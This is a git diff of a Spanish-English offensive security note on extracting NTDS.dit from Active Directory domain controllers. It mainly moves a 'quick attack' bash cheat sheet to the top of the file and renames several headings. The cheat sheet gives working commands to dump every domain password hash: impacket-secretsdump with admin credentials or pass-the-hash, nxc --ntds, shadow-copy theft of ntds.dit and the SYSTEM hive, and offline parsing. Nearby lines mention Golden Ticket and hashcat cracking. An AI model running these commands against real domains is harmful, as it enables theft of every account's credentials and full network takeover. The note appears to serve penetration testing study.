@@ -36,7 +36,33 @@ linked:
 
 ## Cheatsheet
 
-### 🏗️ Architecture y Storage
+### 1. Ataque Rápido (TL;DR)
+
+```bash
+# 1. Remote — más simple (requiere DA creds o hash)
+impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
+
+# 2. Remote via PtH
+impacket-secretsdump -hashes :NTHASH corp.local/administrator@dc01.corp.local -just-dc-ntlm
+
+# 3. nxc (preferred)
+nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds
+
+# 4. Local en DC (post-RCE)
+vssadmin create shadow /for=C:
+# → usar path del shadow copy
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
+
+# 5. Parse offline
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm
+```
+
+---
+
+### 2. Explotación
+
+#### 🏗️ Architecture y Storage
 
 ````tabs
 tab: **Overview**
@@ -58,7 +84,7 @@ tab: **Pre-Attack Recon**
 ![[NTDS.dit Extraction - Architecture y Storage#^ntds-arch-recon]]
 ````
 
-### 🔧 Windows Extraction Methods
+#### 🔧 Windows Extraction Methods
 
 ````tabs
 tab: **vssadmin**
@@ -80,7 +106,7 @@ tab: **OPSEC**
 ![[NTDS.dit Extraction - VSS y ntdsutil Methods#^ntds-vss-opsec]]
 ````
 
-### 🌐 Remote Extraction (DA creds)
+#### 🌐 Remote Extraction (DA creds)
 
 ````tabs
 tab: **secretsdump Live**
@@ -102,7 +128,7 @@ tab: **OPSEC**
 ![[NTDS.dit Extraction - Remote Extraction#^ntds-remote-opsec]]
 ````
 
-### 🔬 Offline Parsing
+#### 🔬 Offline Parsing
 
 ````tabs
 tab: **secretsdump LOCAL**
@@ -124,7 +150,7 @@ tab: **Hash Formats**
 ![[NTDS.dit Extraction - Offline Parsing#^ntds-offline-hashfmt]]
 ````
 
-### 🛡️ Detection & Mitigations
+#### 🛡️ Detection & Mitigations
 
 ````tabs
 tab: **Detection Events**
@@ -146,7 +172,7 @@ tab: **Bypass Comparison**
 ![[NTDS.dit Extraction - Detection y Mitigations#^ntds-detect-bypass]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **impacket-secretsdump**
@@ -221,30 +247,6 @@ Requiere: DA, Backup Operators, o cuenta con `SeBackupPrivilege`. Post-extracci�
    - krbtgt hash → Golden Ticket.
    - AES256 keys → Overpass-the-Hash / Silver Ticket.
    - Crack offline con hashcat -m 1000.
-```
-
----
-
-## Detección rápida
-
-```bash
-# 1. Remote — más simple (requiere DA creds o hash)
-impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
-
-# 2. Remote via PtH
-impacket-secretsdump -hashes :NTHASH corp.local/administrator@dc01.corp.local -just-dc-ntlm
-
-# 3. nxc (preferred)
-nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds
-
-# 4. Local en DC (post-RCE)
-vssadmin create shadow /for=C:
-# → usar path del shadow copy
-copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
-copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
-
-# 5. Parse offline
-impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm
 ```
 
 ---
